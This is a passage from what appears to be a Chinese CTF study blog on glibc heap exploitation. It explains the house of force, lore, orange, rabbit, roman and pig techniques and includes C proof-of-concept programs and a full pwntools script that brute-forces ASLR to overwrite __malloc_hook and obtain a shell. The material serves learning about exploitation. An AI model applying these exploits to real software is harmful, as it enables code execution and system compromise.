class="number">0x8</span></span><br><span class="line">	<span class="comment">#debug()</span></span><br><span class="line">	add(offset, <span class="string">b&quot;d&quot;</span>)</span><br><span class="line">	</span><br><span class="line">	add(<span class="number">0x10</span>, p64(magic) * <span class="number">2</span>)</span><br><span class="line">	<span class="built_in">print</span>(p.recv())</span><br><span class="line">	p.interactive()</span><br><span class="line">	</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	exp()</span><br></pre></td></tr></table></figure>
<h2 id="例题2"><a href="#例题2" class="headerlink" title="例题2"></a>例题2</h2><p><strong>bcloud</strong></p>
<p>checksec</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/bcloud&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<p>程序是一个笔记管理系统。首先，程序会进行一些初始化，设置用户的名字，组织，host。</p>
<p>程序主要有以下几个功能</p>
<ol>
<li>新建 note，根据用户的输入 x 申请 x+4 的空间作为 note 的大小。</li>
<li>展示 note，啥功能也没有。。</li>
<li>编辑 note，根据用户指定的 note 编辑对应的内容。</li>
<li>删除 note，删除对应 note。</li>
<li>同步 note，标记所有的 note 已经被同步。</li>
</ol>
<p>然而在这五个功能中都没有明显可利用的漏洞,实际上漏洞在开始时。</p>
<p>在读取名字时是先读入到栈中然后再利用strcpy函数转移至堆中,都知道strcpy是遇到空字符才会停止,而栈中<strong>存储堆的指针紧邻着name缓冲区</strong>,这就意味着只要填满name缓冲区,就会将堆指针一起写到堆中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">sub_80487A1</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+1Ch] [ebp-5Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> *tmp; <span class="comment">// [esp+5Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [esp+6Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x50</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your name:&quot;</span>);</span><br><span class="line">  myread((<span class="type">int</span>)s, <span class="number">64</span>, <span class="number">10</span>);</span><br><span class="line">  tmp = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x40</span>u);</span><br><span class="line">  dworr_804B0CC_name = (<span class="type">int</span>)tmp;</span><br><span class="line">  <span class="built_in">strcpy</span>(tmp, s);</span><br><span class="line">  info(tmp);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后info又会将其打印出来,于是泄露了堆地址</p>
<p>之后的读取org和host同样是利用strcpy,不过是这次strcpy可以转移的长度更长可以利用其覆盖topchunk的size</p>
<p>之后</p>
<ol>
<li>利用 house of force 将 top chunk 分配至全局的 0x0804B0A0 的 &amp;notesize-8 处，当再次申请内存时，便返回 notesize 地址处的内存，从而我们就可以控制所有 note 的大小以及对应的地址了。</li>
<li>修改前三个 note 的大小为 16，并修改其指针为 free@got，atoi@got，atoi@got</li>
<li>将 free@got 修改为 puts@plt。</li>
<li>泄漏 atoi 地址。</li>
<li>再次修改另外一个 atoi got 项为 system 地址，从而拿到 shell。</li>
</ol>
<p>这题因为环境的原因只能到此为止,无法实操了</p>
<p><strong>总结主要就是对strcpy的利用,不遇到\x00就不停止</strong></p>
<h1 id="house-of-lore"><a href="#house-of-lore" class="headerlink" title="house of lore"></a>house of lore</h1><h2 id="概要-2"><a href="#概要-2" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong>House of Lore 攻击与 Glibc 堆管理中的 Small Bin 的机制紧密相关。</p>
<p><strong>利用条件:</strong></p>
<ol>
<li>能够控制smallbin最后一个chunk 的 bk 指针</li>
<li>能够控制指定位置 chunk 的 fd 指针</li>
</ol>
<p><strong>利用效果:</strong>分配任意指定位置的 chunk，从而修改任意地址的内存。</p>
<p><strong>有效版本:</strong>ALL</p>
<h2 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h2><p>当malloc申请的chunk在smallbin范围内时</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">  &#123;</span><br><span class="line">    idx = smallbin_index (nb);</span><br><span class="line">    bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">      &#123;</span><br><span class="line">        bck = victim-&gt;bk;</span><br><span class="line"> <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">   malloc_printerr (<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br><span class="line">        set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">        bin-&gt;bk = bck;</span><br><span class="line">        bck-&gt;fd = bin;</span><br></pre></td></tr></table></figure>
<p>如果可以修改 small bin 的最后一个 chunk 的 bk 为我们指定内存地址的 fake chunk，</p>
<p>并且同时满足之后的 bck-&gt;fd == victim 的检测，那么就可以使得 small bin 的 bk 恰好为构造的 fake chunk。</p>
<p>也就是说，当下一次申请 small bin 的时候，就会分配到指定位置的 fake chunk。</p>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">jackpot</span><span class="params">()</span>&#123; <span class="built_in">puts</span>(<span class="string">&quot;Nice jump d00d&quot;</span>); <span class="built_in">exit</span>(<span class="number">0</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> * argv[])</span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="type">intptr_t</span>* stack_buffer_1[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;<span class="comment">//bck</span></span><br><span class="line">  <span class="type">intptr_t</span>* stack_buffer_2[<span class="number">3</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="type">intptr_t</span> *victim = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">  <span class="type">intptr_t</span> *victim_chunk = victim<span class="number">-2</span>;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">  stack_buffer_1[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">2</span>] = victim_chunk;</span><br><span class="line">  stack_buffer_1[<span class="number">3</span>] = (<span class="type">intptr_t</span>*)stack_buffer_2;</span><br><span class="line">  stack_buffer_2[<span class="number">2</span>] = (<span class="type">intptr_t</span>*)stack_buffer_1;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">  <span class="type">void</span> *p5 = <span class="built_in">malloc</span>(<span class="number">1000</span>);<span class="comment">//阻止victim合并到top</span></span><br><span class="line">  </span><br><span class="line">  <span class="built_in">free</span>((<span class="type">void</span>*)victim);<span class="comment">//到unsortedbin中</span></span><br><span class="line">  </span><br><span class="line">  <span class="type">void</span> *p2 = <span class="built_in">malloc</span>(<span class="number">1200</span>);<span class="comment">//victim从unsortedbin中被取出</span></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">  victim[<span class="number">1</span>] = (<span class="type">intptr_t</span>)stack_buffer_1; <span class="comment">//bk</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  <span class="type">void</span> *p3 = <span class="built_in">malloc</span>(<span class="number">100</span>);<span class="comment">//触发,下一次取出就是取出fakechunk</span></span><br><span class="line">  <span class="type">char</span> *p4 = <span class="built_in">malloc</span>(<span class="number">100</span>);<span class="comment">//p4就是(intptr_t*)stack_buffer_1 + 2</span></span><br><span class="line">  </span><br><span class="line">  <span class="type">intptr_t</span> sc = (<span class="type">intptr_t</span>)jackpot; </span><br><span class="line">  <span class="built_in">memcpy</span>((p4+<span class="number">40</span>), &amp;sc, <span class="number">8</span>);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house of orange"></a>house of orange</h1><h2 id="概要-3"><a href="#概要-3" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong>House of Orange 的利用比较特殊，首先需要目标漏洞是堆上的漏洞但是特殊之处在于题目中不存在 free 函数或其他释放堆块的函数。我们知道一般想要利用堆漏洞，需要对堆块进行 malloc 和 free 操作，但是在 House of Orange 利用中无法使用 free 函数，因此 House of Orange 核心就是通过漏洞利用获得 free 的效果。</p>
<p><strong>利用条件:</strong></p>
<ol>
<li>要能够申请一个比top_size更大但是小于0x20000的size(任意大小申请,多次申请,top-size修改)</li>
</ol>
<p><strong>利用效果:</strong>在无free下放入一个chunk到unsortedbin中</p>
<p><strong>有效版本:</strong>ALL</p>
<h2 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h2><p>House of Orange 的核心在于在没有 free 函数的情况下得到一个释放的堆块 (unsorted bin)。 这种操作的原理简单来说是当前堆的 top chunk 尺寸不足以满足申请分配的大小的时候，原来的 top chunk 会被释放并被置入 unsorted bin 中，通过这一点可以在没有 free 函数情况下获取到 unsorted bins。</p>
<p>我们来看一下这个过程的详细情况，我们假设目前的 top chunk 已经不满足 malloc 的分配需求。 首先我们在程序中的<code>malloc</code>调用会执行到 libc.so 的<code>_int_malloc</code>函数中，在<code>_int_malloc</code>函数中，会依次检验 fastbin、small bins、unsorted bin、large bins 是否可以满足分配要求，因为尺寸问题这些都不符合。接下来<code>_int_malloc</code>函数会试图使用 top chunk，在这里 top chunk 也不能满足分配的要求，因此会执行如下分支。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">Otherwise, relay to handle system-dependent cases</span><br><span class="line">*/</span><br><span class="line">else &#123;</span><br><span class="line">      void *p = sysmalloc(nb, av);</span><br><span class="line">      if (p != NULL &amp;&amp; __builtin_expect (perturb_byte, 0))</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">      return p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>此时 ptmalloc 已经不能满足用户申请堆内存的操作，需要执行 sysmalloc 来向系统申请更多的空间。 但是对于堆来说有 mmap 和 brk 两种分配方式，我们需要让堆以 <strong>brk</strong> 的形式拓展，之后原有的 top chunk 会被置于 unsorted bin 中。</p>
<p>综上，我们要实现 brk 拓展 top chunk，但是要实现这个目的需要绕过一些 libc 中的 check。 首先，malloc 的尺寸不能大于<code>mmp_.mmap_threshold</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if ((unsigned long)(nb) &gt;= (unsigned long)(mp_.mmap_threshold) &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max))</span><br></pre></td></tr></table></figure>
<p>如果所需分配的 chunk 大小大于 mmap 分配阈值，默认为 <strong>128K</strong>，并且当前进程使用 mmap() 分配的内存块小于设定的最大值，将使用 mmap() 系统调用直接向操作系统申请内存。</p>
<p><strong>在 sysmalloc 函数中存在对 top chunk size 的 check，如下</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">assert((old_top == initial_top(av) &amp;&amp; old_size == 0) ||</span><br><span class="line">     ((unsigned long) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">      prev_inuse(old_top) &amp;&amp;</span><br><span class="line">      ((unsigned long)old_end &amp; pagemask) == 0));</span><br></pre></td></tr></table></figure>
<p>这里检查了 top chunk 的合法性，如果第一次调用本函数，top chunk 可能没有初始化，所以可能 old_size 为 0。 如果 top chunk 已经初始化了，那么 top chunk 的大小<strong>必须大于等于 MINSIZE</strong>，因为 top chunk 中包含了 fencepost，所以 top chunk 的大小必须要大于 MINSIZE。其次 <strong>top chunk 必须标识前一个 chunk 处于 inuse 状态</strong>，并且 <strong>top chunk 的结束地址必定是页对齐的</strong>。此外 top chunk 除去 fencepost 的大小必定要小于所需 chunk 的大小，否则在_int_malloc() 函数中会使用 top chunk 分割出 chunk。</p>
<p>总结一下伪造的 top chunk size 的要求</p>
<ol>
<li><strong>伪造的 size 必须要对齐到内存页</strong></li>
<li>size 要大于等于 MINSIZE</li>
<li>size 要小于之后申请的 chunk size + MINSIZE</li>
<li>size 的 prev inuse 位必须为 1</li>
</ol>
<p>之后原有的 top chunk 就会执行<code>_int_free</code>从而顺利进入 unsorted bin 中。</p>
<h2 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h2><p><strong>2016 hiton house of orange</strong></p>
<h1 id="house-of-rabbit"><a href="#house-of-rabbit" class="headerlink" title="house of rabbit"></a>house of rabbit</h1><h2 id="概要-4"><a href="#概要-4" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong>House of rabbit 是一种伪造堆块的技术，一般运用在 fastbin attack 中，因为 unsorted bin 等其它的 bin 有更好的利用手段。</p>
<p><strong>利用条件:</strong></p>
<ol>
<li>可以修改 fastbin 的 fd 指针或 size </li>
<li>可以触发 malloc consolidate</li>
</ol>
<p><strong>利用效果:</strong>overlap</p>
<p><strong>有效版本:</strong>2.27以前</p>
<p><strong>失效原因:</strong>2.27及以后malloc_consolidate也开始进行检查了</p>
<h2 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h2><p>fastbin 中会把相同的 size 的被释放的堆块用一个单向链表管理，分配的时候会检查 size 是否合理，如果不合理程序就会异常退出。</p>
<p>而 house of rabbit 就利用了在 malloc consolidate 的时候 fastbin 中的堆块进行合并时 size 没有进行检查从而伪造一个假的堆块，为进一步的利用做准备</p>
<p> <code>POC 1</code>: modify the size of fastbin chunk</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">unsigned long* chunk1=malloc(0x40); //0x602000</span><br><span class="line">unsigned long* chunk2=malloc(0x40); //0x602050</span><br><span class="line">malloc(0x10);</span><br><span class="line">free(chunk1);</span><br><span class="line">free(chunk2);</span><br><span class="line"></span><br><span class="line">chunk1[-1]=0xa1; //modify chunk1 size to be 0xa1</span><br><span class="line">malloc(0x1000);  //allocate a large chunk, trigger malloc consolidate</span><br></pre></td></tr></table></figure>
<p><code>POC 2</code>:modify FD pointer</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">unsigned long* chunk1=malloc(0x40); //0x602000</span><br><span class="line">unsigned long* chunk2=malloc(0x100);//0x602050</span><br><span class="line"></span><br><span class="line">chunk2[1]=0x31; //fake chunk size 0x30</span><br><span class="line">chunk2[7]=0x21  //fake chunk&#x27;s next chunk</span><br><span class="line">chunk2[11]=0x21 //fake chunk&#x27;s next chunk&#x27;s next chuck</span><br><span class="line"></span><br><span class="line">free(chunk1);</span><br><span class="line">chuck1[0]=0x602060;// modify the fd of chunk1</span><br><span class="line">malloc(5000);// malloc a  big chunk to trigger malloc consolidate</span><br></pre></td></tr></table></figure>
<p>原理很简单，就是通过修改 fastbin chunk 的 size(如上面的 POC 1 所示) 直接构造 overlap chunk，或者修改 fd(如面的 POC 2 所示)，让它指向一个 fake chunk，触发 malloc consolidate 之后让这个 fake chunk 成为一个合法的 chunk。</p>
<h2 id="例题-2"><a href="#例题-2" class="headerlink" title="例题"></a>例题</h2><p><strong>HITB-GSEC-XCTF 2018 mutepig</strong></p>
<h1 id="house-of-roman"><a href="#house-of-roman" class="headerlink" title="house of roman"></a>house of roman</h1><h2 id="概要-5"><a href="#概要-5" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong>House of Roman是 fastbin attack(tcache也行) 和 Unsortbin attack 结合的一个用于绕过ASLR(利用 12-bit 的爆破)来达到获取 shell 的目的的技巧。</p>
<p><strong>利用条件:</strong></p>
<ol>
<li>UAF</li>
<li>任意大小chunk申请</li>
</ol>
<p><strong>利用效果:</strong>bypass ALSR</p>
<p><strong>有效版本:</strong>2.29以前</p>
<p><strong>失效原因:</strong>2.29及以后unsortedbin attack失效</p>
<h2 id="原理-5"><a href="#原理-5" class="headerlink" title="原理"></a>原理</h2><p>作者给了一个demo,以此来学习该技术</p>
<p>checksec</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/hor&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<p>程序实现了增删改功能,其中free未置0,edit可以off-by-one</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./hor&quot;</span>,aslr=<span class="number">1</span>)</span><br><span class="line"><span class="comment">#raw_input()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>():</span><br><span class="line">	p.recvuntil(<span class="string">&quot;3. Free&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size,idx</span>):</span><br><span class="line">	menu()</span><br><span class="line">	p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">	p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">	menu()</span><br><span class="line">	p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,data</span>):</span><br><span class="line">	menu()</span><br><span class="line">	p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">	sleep(<span class="number">0.1</span>)</span><br><span class="line">	p.send(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">	gdb.attach(p)</span><br><span class="line">	pause()</span><br><span class="line">name = <span class="string">b&quot;A&quot;</span>*<span class="number">20</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">p.sendline(name)</span><br><span class="line"></span><br><span class="line">create(<span class="number">24</span>,<span class="number">0</span>)</span><br><span class="line">create(<span class="number">200</span>,<span class="number">1</span>)</span><br><span class="line">fake = <span class="string">b&quot;A&quot;</span>*<span class="number">104</span></span><br><span class="line">fake += p64(<span class="number">0x61</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,fake)</span><br><span class="line"></span><br><span class="line">create(<span class="number">101</span>,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">200</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">over = <span class="string">b&quot;A&quot;</span>*<span class="number">24</span></span><br><span class="line">over += <span class="string">b&quot;\x71&quot;</span></span><br><span class="line">edit(<span class="number">0</span>,over)</span><br><span class="line"></span><br><span class="line">create(<span class="number">101</span>,<span class="number">3</span>)</span><br><span class="line">create(<span class="number">101</span>,<span class="number">15</span>)</span><br><span class="line">create(<span class="number">101</span>,<span class="number">16</span>)</span><br><span class="line">create(<span class="number">101</span>,<span class="number">17</span>)</span><br><span class="line">create(<span class="number">101</span>,<span class="number">18</span>)</span><br><span class="line">create(<span class="number">101</span>,<span class="number">19</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">heap_po = <span class="string">b&quot;\x20&quot;</span></span><br><span class="line">edit(<span class="number">3</span>,heap_po)</span><br><span class="line"></span><br><span class="line">arena_po = <span class="string">b&quot;\xed\x8a&quot;</span></span><br><span class="line">edit(<span class="number">1</span>,arena_po)</span><br><span class="line"></span><br><span class="line"><span class="comment">#raw_input()</span></span><br><span class="line">create(<span class="number">101</span>,<span class="number">0</span>)</span><br><span class="line">create(<span class="number">101</span>,<span class="number">0</span>)</span><br><span class="line">create(<span class="number">101</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.interactive()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Control arena through 0.</span></span><br><span class="line"><span class="comment"># Now unsorted bin attack.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># First fix 0x71 freelist.</span></span><br><span class="line">free(<span class="number">15</span>)</span><br><span class="line">edit(<span class="number">15</span>,p64(<span class="number">0x00</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Fixed.</span></span><br><span class="line">create(<span class="number">200</span>,<span class="number">1</span>)</span><br><span class="line">create(<span class="number">24</span>,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">po = <span class="string">b&quot;B&quot;</span>*<span class="number">8</span></span><br><span class="line">po += <span class="string">b&quot;\x00\x8b&quot;</span></span><br><span class="line">dbg()</span><br><span class="line">edit(<span class="number">1</span>,po)</span><br><span class="line"></span><br><span class="line">create(<span class="number">200</span>,<span class="number">1</span>)</span><br><span class="line"><span class="comment">#4527a</span></span><br><span class="line">over = <span class="string">b&quot;R&quot;</span>*<span class="number">19</span></span><br><span class="line">over += <span class="string">b&quot;\x7a\x92\xf3&quot;</span></span><br><span class="line">edit(<span class="number">0</span>,over)</span><br><span class="line"></span><br><span class="line">create(<span class="number">200</span>,<span class="number">7</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	resp = p.recv(<span class="number">4</span>, timeout=<span class="number">6</span>)</span><br><span class="line">	p.interactive()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">	p.close()</span><br></pre></td></tr></table></figure>
<p>只有1/65536的概率成功</p>
<p>流程大致如下:</p>
<ol>
<li>将一个unsortedbin范围的chunk-A进行free使main_arena+88写入</li>
<li>修改A的size为0x71</li>
<li>挂两个0x71的chunk进入fastbin</li>
<li>部分写使A被挂入fastbin</li>
<li>第一次爆破写&amp;__malloc_hook-0x23到A的fd(1/16)</li>
<li>将__malloc_hook-0x23申请出来</li>
<li>修复fastbin</li>
<li>将一个chunk-B放入unsortedbin中,部分写bk为&amp;<em>_malloc_hook-0x10,利用unsorted攻击写入main_arena+88至&amp;\</em>_malloc_hook</li>
<li>第二次爆破写__malloc_hook为one_gadget(1/4096)</li>
</ol>
<p>还挺复杂的,主要就是部分写覆盖main_arena+88进行爆破</p>
<h1 id="house-of-pig"><a href="#house-of-pig" class="headerlink" title="house of pig"></a>house of pig</h1><h2 id="概要-6"><a href="#概要-6" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong>House of Pig 是一个将 Tcache Stash Unlink+ Attack 和 FSOP 结合的攻击，同时使用到了 Largebin Attack 进行辅助。主要适用于 libc 2.31 及以后的新版本 libc 并且程序中仅有 calloc 时。</p>
<p><strong>利用条件:</strong></p>
<ol>
<li>UAF</li>
<li>能执行 abort 流程或程序显式调用 exit 或程序能通过主函数返回</li>
</ol>
<p><strong>利用效果:</strong>在无malloc函数下利用tcache操作__free_hook</p>
